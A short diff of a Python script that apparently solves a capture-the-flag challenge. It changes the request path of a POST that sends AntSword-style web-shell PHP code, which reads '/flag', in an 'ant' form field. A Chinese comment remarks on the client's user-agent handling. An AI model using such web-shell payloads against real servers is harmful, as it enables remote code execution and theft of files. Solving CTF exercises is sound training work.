@@ -38,7 +38,7 @@ def build(code):
 def main():
     payload, tag_s, tag_e = build('echo @file_get_contents("/flag");')
     req = urllib.request.Request(
-        BASE + "/ant.php",
+        BASE + "/",
         data=urllib.parse.urlencode({"ant": payload}).encode(),
         # 蚁剑 UA 为随机浏览器 UA（random-fake-useragent），本题不校验 UA
         headers={"User-Agent": "Mozilla/5.0"},
